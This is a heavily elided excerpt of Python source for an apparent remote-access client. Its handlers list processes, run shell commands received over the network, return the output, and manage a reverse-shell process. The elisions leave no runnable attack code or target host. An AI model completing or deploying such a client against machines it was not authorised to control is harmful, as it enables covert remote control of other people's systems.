...
from client.app_concurrent.channels.double import AppNetDoubleQueuedChannel
...
class Application:
    def __init__(self):
        self.running = False
        self.net_channel = AppNetDoubleQueuedChannel()  # not used yet
        self.net_client_service = NetClientService(self, self.net_channel)
    ...
    def run(self):
        ...
        self.net_client_service.start_async()
    ...
    def handle_ps_packet(self, packet):
        ...
        elif packet.ps == PacketProcess.Actions.List:
            processes = []
            counter = 10
    ...
    def handle_shell_packet(self, packet):
        ...
        if packet.shell_action == PacketShell.Actions.Exec:
            ...
            if command is not None:
                ...
                packet.shell_data = output[0].decode()
                self.net_client_service.send_packet(packet)
    ...
    def read_shell_out(self):
        try:
            ...
            print(self.reverse_shell_active)
    ...
    def pipe_to_shell(self, command):
        if self.reverse_shell_process is None or self.reverse_shell_process.poll() is not None:
            print('Reverse Shell is not active')
            return
